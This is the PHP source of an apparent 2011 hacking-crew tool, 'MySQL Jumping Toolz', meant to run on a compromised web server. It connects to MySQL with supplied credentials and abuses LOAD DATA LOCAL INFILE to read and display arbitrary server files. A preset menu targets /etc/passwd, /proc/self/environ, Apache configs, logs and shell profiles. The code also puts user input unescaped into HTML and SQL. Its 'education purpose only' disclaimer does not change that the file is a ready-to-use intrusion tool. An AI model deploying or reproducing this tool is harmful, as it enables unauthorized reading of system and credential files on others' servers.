<?php
/**
 * @author      Jasman
 * @package	SQL Jumping
 * @copyright	Copyright (C) 2011 Www.ExploreCrew.Org.
 * @license	GNU General Public License version 2 or later; see LICENSE.txt
 * 
 * Notice:
 * All content education purphose only. 
 * Any consequences in views of the use of scripts, techniques, codes, 
 * tutorials, and everything imaginable are purely the 
 * responsibility of the user, NOT ExploreCrew.Org
 * 
 * Credit:
 * ArRay, `yuda, N4ck0, K4pt3N, samu1241, bejamz, Gameover, antitos, yuki, pokeng, aphe_aphe, jos_ali_joe, BlueBoyz,
 * JFry_, Viva ExploreCrew.Org, AnaskiCrewz, Ihsana's Labs, JibanCrew
 * We hate Ripper!! Please don't remove or change author name of posted article/code, Just to add credit if you fix it.
 */

error_reporting(0);
$dbuser = trim($_POST['dbuser']) ;
$dbpass = trim($_POST['dbpass']) ;
$dbhost = trim($_POST['dbhost']) ;
$dbname = trim($_POST['dbname']);
if ($_POST['readfile'] == ""){$readfile = trim($_POST['getfile']);} else {$readfile = trim($_POST['readfile']);}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<meta name="author" content="JasMaN" />
	<title>MySQL JuMpiNg TooLz Coded by JasMaN</title>
    <style type="text/css">
    <!--
    	pre{border: 1px solid #000; margin: 3px; padding: 3px;font-size: 12px;}
        body {background: #000;}
        #box {background: #333; color: #fff; margin: auto; width: 1000px;border: 1px solid #666;font-size: 12px;}
        input,option,select{border: 1px solid #666; color: #00FF00;background: #000;font-size: 12px;}
        #notice {margin: 3px; padding: 3px; border: 1px solid red;font-size: 12px;}
        h3 {text-align: center; font-size: 24px;}
    -->
    </style>
</head>
<body>
<div id="box">
<h3>MySQL JuMpiNg TooLz<br />Coded by BlueBoyz</h3>

<form method="post" action="" >
<table>
<tr>
	<td>Database</td>
	<td>:</td>
	<td><input type="text" name="dbname" value="<?php echo $dbname ?>" /></td>
</tr>
<tr>
	<td>Username</td>
	<td>:</td>
	<td><input type="text" name="dbuser" value="<?php echo $dbuser ?>" /></td>
</tr>
<tr>
	<td>Password</td>
	<td>:</td>
	<td><input type="text" name="dbpass" value="<?php echo $dbpass ?>" /></td>
</tr>
<tr>
	<td>Host</td>
	<td>:</td>
	<td><input type="text" name="dbhost" value="<?php echo $dbhost ?>" /></td>
</tr>
<tr>
	<td>Get File</td>
	<td>:</td>
	<td>
    <input type="text" name="readfile" value="<?php echo $readfile ?>" size="50" />
    <select size="1" name="getfile">
        <option value="/etc/passwd">Enumerate User</option>
        <option value="/proc/version">uname -a</option>
        <option value="/etc/issue">Os</option>
        <option value="/etc/issue.net">Os.Net</option>
        <option value="/etc/kernel-img.conf">Kernel Info</option>
        <option value="/etc/debian_version">Debian Version</option>
        <option value="/etc/redhat-release">Redhat Release</option>
        <option value="/proc/meminfo">Free Memory</option>
        <option value="/proc/cpuinfo">CPU Info</option>
        <option value="/var/log/installer/lsb-release">Linux installer</option>
        <option value="/proc/pci">PCI devices</option>
        <option value="/proc/self/environ">Environ</option>
        <option value="/etc/httpd.conf">/etc/httpd.conf</option>
        <option value="/etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
        <option value="/etc/apache2/apache2.conf">/etc/apache2/apache2.conf</option>
        <option value="/etc/apache2/httpd.conf">/etc/apache2/httpd.conf</option>
        <option value="/etc/apache2/conf.d/application.conf">/etc/apache2/conf.d/application.conf</option>
        <option value="/error_log">/error_log</option>
        <option value="/error.log">/error.log</option>
        <option value="/var/log/apache2/error_log">/var/log/apache2/error_log</option>
        <option value="/var/log/apache2/error.log">/var/log/apache2/error.log</option>
        <option value="/.bash_logout">/.bash_logout</option>
        <option value="/.contactemail">/.contactemail</option>
        <option value="/.htaccess">/.htaccess</option>
        <option value="/cpbackup-exclude.conf">/cpbackup-exclude.conf</option>
        <option value="/.bash_profile">/.bash_profile</option>
        <option value="/.bashrc">/.bashrc</option>
        </select>
    </td>
</tr>
<tr>
	<td></td>
	<td></td>
	<td><input type="submit" value="Connect" /></td>
</tr>
</table>
</form>
<div id="notice">
<?php
$con = mysql_connect($dbhost,$dbuser,$dbpass);
echo "** try connect host to '".$dbhost."' : ok<br/>" ;
echo "** send username '".$dbuser."' : ok<br/>" ;
echo "** send password '".$dbpass."' : ok<br/>";
if (!$con){die(mysql_error());}
mysql_select_db($dbname, $con);
$createtable = "CREATE TABLE IF NOT EXISTS `dbtemp` ( `file` longtext NOT NULL );";
$file = "LOAD DATA LOCAL INFILE '$readfile' INTO TABLE `dbtemp` (`file`);";
if (mysql_query($createtable) ==1){
    echo "** created table : ok<br/>";
    if (mysql_query("TRUNCATE TABLE `dbtemp`")){echo "** clear temp : ok<br/>";};
    if (mysql_query($file)==1){echo "** read file ".$readfile.": ok<br/>";} else {echo "** read file ".$readfile.": failed<br/>";} ;
    echo "</div>";
    $readstr = mysql_query("SELECT * FROM `dbtemp`");
    echo "<pre>";
    echo @php_uname();
    echo "<hr/>";
    while ($filestr = mysql_fetch_array($readstr)){
    echo $filestr['file'];
    }
    echo "</pre>";
} else {
    echo "** created table : failed<br/>";
};

?>

    <hr />
    <div class="foot">Thank to:
    | ArRay | `yuda | N4ck0 | K4pt3N | samu1241 | bejamz | Gameover | antitos | yuki | pokeng | aphe_aphe | jos_ali_joe | BlueBoyz | <br />
    <em> JFry_, Viva ExploreCrew.Org, AnaskiCrewz</em> 
    </div>
</div>
</body>
</html>
